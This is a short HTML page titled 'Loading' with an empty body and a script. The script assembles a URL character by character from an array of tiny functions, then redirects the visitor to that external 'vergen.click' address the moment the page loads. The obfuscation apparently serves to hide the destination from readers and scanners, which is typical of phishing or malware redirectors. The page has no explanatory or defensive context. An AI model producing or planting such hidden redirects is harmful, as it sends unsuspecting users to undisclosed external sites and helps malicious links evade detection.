<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            _ => 't',
            () => 't',
            _ => 'p',
            () => 's',
            function() { return ':'; },
            function() { return '/'; },
            _ => '/',
            function() { return 'v'; },
            () => 'e',
            function() { return 'r'; },
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            _ => '.',
            () => 'c',
            _ => 'l',
            function() { return 'i'; },
            () => 'c',
            function() { return 'k'; },
            () => '/',
            _ => 's',
            () => '/',
            () => 'n',
            function() { return 'e'; },
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
